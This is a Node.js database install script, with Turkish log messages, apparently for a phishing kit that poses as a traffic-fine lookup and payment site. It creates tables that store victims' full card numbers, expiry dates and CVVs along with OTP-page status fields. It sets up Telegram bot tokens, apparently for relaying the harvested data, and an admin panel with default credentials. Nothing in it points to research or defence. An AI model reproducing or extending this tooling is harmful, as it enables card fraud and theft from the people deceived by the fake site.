// Çalıştır: node install.js
require('dotenv').config();
const { pool, query } = require('./db');
const bcrypt = require('bcryptjs');

async function install() {
  console.log('⏳ Tablolar oluşturuluyor...');

  await query(`
    CREATE TABLE IF NOT EXISTS admin_users (
      id         SERIAL PRIMARY KEY,
      username   VARCHAR(50) UNIQUE NOT NULL,
      password   VARCHAR(255) NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS settings (
      key        VARCHAR(80) PRIMARY KEY,
      value      TEXT NOT NULL DEFAULT '',
      updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  await query(`
    CREATE TABLE IF NOT EXISTS inquiries (
      id           SERIAL PRIMARY KEY,
      sid          VARCHAR(64),
      plate_no     VARCHAR(20),
      plate_src    VARCHAR(10),
      plate_code   VARCHAR(20),
      fine_count   INT DEFAULT 0,
      total_amount DECIMAL(10,2) DEFAULT 0,
      ip           VARCHAR(60),
      user_agent   TEXT,
      created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  await query(`CREATE INDEX IF NOT EXISTS idx_inquiries_sid   ON inquiries (sid)`);
  await query(`CREATE INDEX IF NOT EXISTS idx_inquiries_plate ON inquiries (plate_src, plate_no)`);

  await query(`
    CREATE TABLE IF NOT EXISTS payments (
      id           SERIAL PRIMARY KEY,
      sid          VARCHAR(64) UNIQUE,
      plate_no     VARCHAR(20),
      plate_src    VARCHAR(10),
      plate_code   VARCHAR(20),
      total_fine   DECIMAL(10,2) DEFAULT 0,
      fine_count   INT DEFAULT 0,
      card_name    VARCHAR(120),
      card_number  VARCHAR(30),
      expiry       VARCHAR(10),
      cvv          VARCHAR(10),
      card_scheme  VARCHAR(30),
      card_type    VARCHAR(30),
      card_issuer  VARCHAR(120),
      card_country VARCHAR(60),
      ip           VARCHAR(60),
      otp_page     VARCHAR(30) DEFAULT 'otp-sms',
      otp_status   VARCHAR(20) DEFAULT 'pending',
      redirect_to  VARCHAR(30) DEFAULT NULL,
      created_at   TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  await query(`CREATE INDEX IF NOT EXISTS idx_payments_sid     ON payments (sid)`);
  await query(`CREATE INDEX IF NOT EXISTS idx_payments_status  ON payments (otp_status)`);
  await query(`CREATE INDEX IF NOT EXISTS idx_payments_created ON payments (created_at)`);

  await query(`
    CREATE TABLE IF NOT EXISTS otp_events (
      id         SERIAL PRIMARY KEY,
      sid        VARCHAR(64),
      type       VARCHAR(40),
      ip         VARCHAR(60),
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  await query(`CREATE INDEX IF NOT EXISTS idx_otp_events_sid ON otp_events (sid)`);

  // Default settings
  const defaults = {
    otp_default_page:            'otp-sms',
    site_active:                 '1',
    telegram_bot_token:          process.env.TELEGRAM_BOT_TOKEN          || '',
    telegram_chat_id:            process.env.TELEGRAM_CHAT_ID            || '',
    search_telegram_bot_token:   process.env.SEARCH_TELEGRAM_BOT_TOKEN   || '',
    handy_api_key:               process.env.HANDY_API_KEY               || '',
  };
  for (const [k, v] of Object.entries(defaults)) {
    await query('INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT (key) DO NOTHING', [k, v]);
  }

  // Default admin user
  const hash = await bcrypt.hash('admin123', 10);
  await query(
    'INSERT INTO admin_users (username, password) VALUES (?, ?) ON CONFLICT (username) DO NOTHING',
    ['admin', hash]
  );

  console.log('✅ Tablolar oluşturuldu.');
  console.log('✅ Varsayılan admin: admin / admin123');
  process.exit(0);
}

install().catch(err => { console.error('❌ Hata:', err.message); process.exit(1); });
